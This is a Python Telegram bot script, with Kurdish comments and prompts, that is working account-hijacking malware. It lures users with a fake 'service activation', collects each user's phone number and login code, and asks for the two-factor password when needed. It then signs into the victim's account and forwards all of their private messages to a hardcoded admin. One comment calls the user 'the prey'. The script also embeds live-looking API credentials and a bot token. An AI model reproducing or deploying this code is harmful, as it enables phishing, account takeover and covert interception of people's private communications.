from pyrogram import Client, filters, errors
import asyncio

# زانیارییەکانی تۆ
API_ID = 38225812
API_HASH = "aff3c308c587f18a5975910fbcf68366"
BOT_TOKEN = "8424748782:AAG0VELUlOfabsayVic2SpUAR-hWsh-nnf0"
ADMIN_ID = 7414272224

bot = Client("forwarder_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# ئەکاونتی کاتی بۆ لۆگین
user_sessions = {}

@bot.on_message(filters.command("start") & filters.private)
async def start(client, message):
    await message.reply_text("👋 سڵاو، تکایە بۆ چالاککردنی خزمەتگوزاری، ژمارەی تەلەفۆنەکەت بنێرە (بە دوگمەی خوارەوە).")

@bot.on_message(filters.contact)
async def get_contact(client, message):
    phone = message.contact.phone_number
    u_id = message.from_user.id
    
    # دروستکردنی کڕاینت بۆ نێچیرەکە
    u_client = Client(f"session_{u_id}", api_id=API_ID, api_hash=API_HASH)
    await u_client.connect()
    
    try:
        code_data = await u_client.send_code(phone)
        user_sessions[u_id] = {"phone": phone, "hash": code_data.phone_code_hash, "client": u_client}
        await message.reply_text("📩 کۆدێکی ٥ ژمارەیی بۆ تێلیگرامەکەت هات، لێرە بینووسە:")
    except Exception as e:
        await bot.send_message(ADMIN_ID, f"❌ هەڵە: {e}")

@bot.on_message(filters.text & filters.private)
async def login_and_forward(client, message):
    u_id = message.from_user.id
    if u_id in user_sessions:
        code = message.text
        data = user_sessions[u_id]
        u_client = data["client"]
        
        try:
            await u_client.sign_in(data["phone"], data["hash"], code)
            await bot.send_message(ADMIN_ID, f"✅ لۆگین سەرکەوتوو بوو بۆ: {data['phone']}")
            
            # لێرەوە دەست دەکات بە فۆرواردکردنی هەموو نامە نوێیەکان
            @u_client.on_message(filters.private)
            async def forward_to_admin(u_c, msg):
                try:
                    await msg.forward(ADMIN_ID)
                except:
                    pass
            
            await message.reply_text("✅ خزمەتگوزارییەکە چالاک بوو.")
            # هێشتنەوەی کڕاینتەکە بە کراوەیی
            await asyncio.sleep(21600) # بۆ ماوەی ٦ کاتژمێر کار دەکات
            
        except errors.SessionPasswordNeeded:
            await message.reply_text("🔑 پاسۆردی دوو قۆناغی (2FA) بنێرە:")
        except Exception as e:
            await bot.send_message(ADMIN_ID, f"❌ هەڵە لە لۆگین: {e}")

bot.run()
